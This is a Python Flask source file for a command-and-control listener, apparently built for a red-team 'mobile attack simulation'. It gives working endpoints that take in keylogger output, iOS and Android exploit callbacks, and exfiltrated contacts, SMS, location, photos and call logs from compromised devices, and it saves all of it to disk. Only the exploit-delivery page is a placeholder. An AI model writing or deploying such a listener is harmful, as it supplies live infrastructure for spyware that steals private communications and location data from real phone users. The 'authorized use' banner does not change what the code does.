#!/usr/bin/env python3
"""
Simple C2 Listener for Mobile Attack Simulation
Receives keylogger data and other exfiltrated information
"""

import os
import json
import logging
from datetime import datetime
from flask import Flask, request, jsonify
from pathlib import Path

# Create directories for exfiltrated data
EXFIL_DIR = Path("exfiltrated_data")
EXFIL_DIR.mkdir(exist_ok=True)
(EXFIL_DIR / "keylogger").mkdir(exist_ok=True)
(EXFIL_DIR / "contacts").mkdir(exist_ok=True)
(EXFIL_DIR / "sms").mkdir(exist_ok=True)
(EXFIL_DIR / "location").mkdir(exist_ok=True)

# Configure logging
logging.basicConfig(
    level=logging.INFO,
    format='%(asctime)s - %(levelname)s - %(message)s',
    handlers=[
        logging.FileHandler('logs/c2_listener.log'),
        logging.StreamHandler()
    ]
)
logger = logging.getLogger(__name__)

app = Flask(__name__)

@app.route('/')
def index():
    """C2 Server Status Page"""
    return """
    <html>
    <head><title>C2 Listener - Project Red</title></head>
    <body style="background: #000; color: #0f0; font-family: monospace; padding: 20px;">
        <h1>🎯 C2 Listener Active</h1>
        <p>Command & Control Server for Mobile Attack Simulation</p>
        <p>Status: <span style="color: #0f0;">ONLINE</span></p>
        <hr>
        <h2>Available Endpoints:</h2>
        <ul>
            <li><code>POST /keylog</code> - Receive keylogger data</li>
            <li><code>POST /ios_callback</code> - iOS exploit callback</li>
            <li><code>POST /android_callback</code> - Android exploit callback</li>
            <li><code>POST /exfil/contacts</code> - Contacts exfiltration</li>
            <li><code>POST /exfil/sms</code> - SMS exfiltration</li>
            <li><code>POST /exfil/location</code> - Location data</li>
            <li><code>GET /health</code> - Health check</li>
        </ul>
        <hr>
        <p>⚠️ AUTHORIZED USE ONLY - All activity is logged and monitored</p>
    </body>
    </html>
    """

@app.route('/health', methods=['GET'])
def health():
    """Health check endpoint"""
    return jsonify({
        'status': 'operational',
        'timestamp': datetime.utcnow().isoformat(),
        'service': 'c2_listener'
    })

@app.route('/keylog', methods=['GET', 'POST'])
def receive_keylog():
    """Receive keylogger data from compromised devices"""
    try:
        # Handle GET requests (for testing/monitoring)
        if request.method == 'GET':
            return jsonify({
                'endpoint': '/keylog',
                'methods': ['GET', 'POST'],
                'description': 'Keylogger data reception endpoint',
                'status': 'operational',
                'usage': 'POST keylogger data in JSON or text format'
            }), 200

        # Handle POST requests (actual data reception)
        # Get data from request
        if request.content_type == 'application/json':
            data = request.get_json()
            content = json.dumps(data, indent=2)
        else:
            content = request.data.decode('utf-8', errors='ignore')

        # Save to file with timestamp
        timestamp = datetime.utcnow().strftime('%Y%m%d_%H%M%S')
        filename = EXFIL_DIR / "keylogger" / f"keylog_{timestamp}.txt"

        with open(filename, 'a') as f:
            f.write(f"[{datetime.utcnow().isoformat()}]\n")
            f.write(content)
            f.write("\n" + "="*80 + "\n")

        logger.info(f"[KEYLOG] Received {len(content)} bytes from {request.remote_addr}")
        logger.info(f"[KEYLOG] Saved to: {filename}")

        return jsonify({
            'success': True,
            'message': 'Keylog data received',
            'bytes_received': len(content)
        }), 200

    except Exception as e:
        logger.error(f"[KEYLOG ERROR] {e}")
        return jsonify({'success': False, 'error': str(e)}), 500

@app.route('/ios_callback', methods=['POST'])
def ios_callback():
    """iOS exploit callback endpoint"""
    try:
        data = request.get_json() if request.is_json else {}
        device_id = data.get('device_id', 'unknown')

        logger.info(f"[iOS CALLBACK] Device: {device_id} | IP: {request.remote_addr}")

        # Save callback data
        timestamp = datetime.utcnow().strftime('%Y%m%d_%H%M%S')
        filename = EXFIL_DIR / f"ios_callback_{device_id}_{timestamp}.json"

        with open(filename, 'w') as f:
            json.dump({
                'timestamp': datetime.utcnow().isoformat(),
                'device_id': device_id,
                'source_ip': request.remote_addr,
                'data': data
            }, f, indent=2)

        return jsonify({
            'success': True,
            'message': 'iOS callback received',
            'session_id': f"ios_{timestamp}"
        }), 200

    except Exception as e:
        logger.error(f"[iOS CALLBACK ERROR] {e}")
        return jsonify({'success': False, 'error': str(e)}), 500

@app.route('/android_callback', methods=['POST'])
def android_callback():
    """Android exploit callback endpoint"""
    try:
        data = request.get_json() if request.is_json else {}
        device_id = data.get('device_id', 'unknown')

        logger.info(f"[ANDROID CALLBACK] Device: {device_id} | IP: {request.remote_addr}")

        # Save callback data
        timestamp = datetime.utcnow().strftime('%Y%m%d_%H%M%S')
        filename = EXFIL_DIR / f"android_callback_{device_id}_{timestamp}.json"

        with open(filename, 'w') as f:
            json.dump({
                'timestamp': datetime.utcnow().isoformat(),
                'device_id': device_id,
                'source_ip': request.remote_addr,
                'data': data
            }, f, indent=2)

        return jsonify({
            'success': True,
            'message': 'Android callback received',
            'session_id': f"android_{timestamp}"
        }), 200

    except Exception as e:
        logger.error(f"[ANDROID CALLBACK ERROR] {e}")
        return jsonify({'success': False, 'error': str(e)}), 500

@app.route('/exfil/<data_type>', methods=['POST'])
def exfiltrate_data(data_type):
    """Generic endpoint for data exfiltration"""
    try:
        if data_type not in ['contacts', 'sms', 'location', 'photos', 'call_logs']:
            return jsonify({'success': False, 'error': 'Invalid data type'}), 400

        # Get data
        if request.content_type == 'application/json':
            data = request.get_json()
            content = json.dumps(data, indent=2)
        else:
            content = request.data.decode('utf-8', errors='ignore')

        # Save to file
        timestamp = datetime.utcnow().strftime('%Y%m%d_%H%M%S')
        filename = EXFIL_DIR / data_type / f"{data_type}_{timestamp}.txt"

        with open(filename, 'w') as f:
            f.write(f"[{datetime.utcnow().isoformat()}]\n")
            f.write(f"Source: {request.remote_addr}\n")
            f.write("="*80 + "\n")
            f.write(content)
            f.write("\n")

        logger.info(f"[EXFIL] {data_type.upper()} data received from {request.remote_addr}")
        logger.info(f"[EXFIL] Saved to: {filename}")

        return jsonify({
            'success': True,
            'message': f'{data_type} data exfiltrated successfully',
            'bytes_received': len(content)
        }), 200

    except Exception as e:
        logger.error(f"[EXFIL ERROR] {data_type}: {e}")
        return jsonify({'success': False, 'error': str(e)}), 500

@app.route('/exploit/<target>', methods=['GET'])
def exploit_page(target):
    """Exploit delivery page (simulated)"""
    logger.warning(f"[EXPLOIT PAGE] Target {target} accessed exploit from {request.remote_addr}")

    return """
    <html>
    <head><title>Loading...</title></head>
    <body>
        <h2>Processing...</h2>
        <script>
            console.log("Exploit simulation - DEMO MODE");
            // In production, this would contain the actual exploit payload
        </script>
    </body>
    </html>
    """

if __name__ == '__main__':
    logger.info("="*80)
    logger.info("C2 LISTENER STARTING")
    logger.info("="*80)
    logger.info("iOS Callback Port: 4444 (configure externally)")
    logger.info("Android Callback Port: 4445 (configure externally)")
    logger.info("Main C2 Port: 4000")
    logger.info(f"Exfiltration Directory: {EXFIL_DIR.absolute()}")
    logger.info("="*80)

    # Run on port 4000 for general C2 operations
    app.run(
        host='0.0.0.0',
        port=4000,
        debug=False
    )
